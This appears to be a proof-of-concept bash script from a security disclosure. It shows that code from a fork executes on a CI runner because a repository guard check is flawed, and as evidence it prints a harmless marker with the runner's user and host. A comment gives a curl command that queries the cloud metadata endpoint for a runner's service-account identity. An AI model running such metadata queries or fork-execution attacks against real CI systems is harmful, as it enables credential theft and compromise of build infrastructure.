#!/usr/bin/env bash
# This file was overwritten by the FORK. Its presence in the CI log proves that
# fork-controlled code executed on the runner under the github.repository== non-guard.
# On Google's self-hosted ml-actions runners the equivalent line would be, e.g.:
#   curl -s -H "Metadata-Flavor: Google" \
#     http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/email
# Here it is a harmless marker only.
echo ">>> ATTACKER-CONTROLLED CODE EXECUTED FROM FORK <<<"
echo "runner_user=$(id -un) runner_host=$(hostname) utc=$(date -u +%FT%TZ)"
echo "head_repo=cvredd/fork-guard-poc base_repo=venkatchalla06/fork-guard-poc"
